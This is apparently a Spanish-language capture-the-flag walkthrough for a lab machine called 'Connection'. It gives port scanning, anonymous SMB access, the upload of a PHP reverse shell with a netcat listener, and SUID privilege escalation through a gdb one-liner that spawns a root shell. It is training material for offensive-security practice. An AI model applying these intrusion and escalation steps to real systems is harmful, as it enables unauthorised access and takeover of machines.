# Connection

-------
### Fase de Escaneo

Primero realizamos un arp-scan para saber la ip de la máquina objetivo.

```
sudo arp-scan -I eth0 --localnet
```

Realizamos un escaneo de los puertos abiertos de la máquina

```
sudo nmap -p- --open- -sS --min-rate 5000 -vvv -n -Pn <ip> -oG allPorts
```

Hacemos un escaneo de las versiones de los puertos abiertos.

```
nmap -sCV -p<puertos><ip> -oN Targeted  
```

---
### Fase de enumeración

Hacemos una enumeración al puerto 445 el cual corre el servicio de smb.

>[!tip]
>Las carpetas que contienen "$" están previamente configuradas, las que no necesitan contraseñas son las que no los tiene.

```
smbclient\\\<ip>\\<carpeta>
```
---
### Fase de Explotación

una vez ya adentro del servicio de smb, subiermos un archivo php malicioso, para que nos otorgue una bash interactiva. 

>[!info]
> Utilizamos esta web para obtener el codigo que nos regrese una bash a nuesta ip. [reverseshell.com](https://www.revshells.com/)

subimos el archivo malicioso.

```
smb/> put shell.php
```

nos colocamos en modo escucha por el puerto que asignamos en el archivo php por netcat.

```
nc -lvnp 4444
```
---
### Tratamiento de la TTY

```
script /dev/null -c bash
``````

```
ctrl + z
stty raw -echo; fg
reset xterm
```

```
export TERM=xterm
export SHELL=bash
```
---
### User Flag

Obtuvimos la primera flag.

```
cat /home/connection/local.txt
```
---
### Escalada de Privilegio

Con este comando buscamos desde la raíz los binarios con permisos SUID y los errores le decimos que los redirija al /dev/null

```
find / -perm -4000 2>/dev/null
```

Encontramos un binario para explotar.

```
/usr/bin/gdb
```

>[!tip]
>podemos utilizar esta página para realizar la explotación [GTFOBins](https://gtfobins.github.io/)

```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```
---
### Flag Root

Obtenemos la flag root y máquina totalmente pwned.

```
cat /root/proof.txt
```

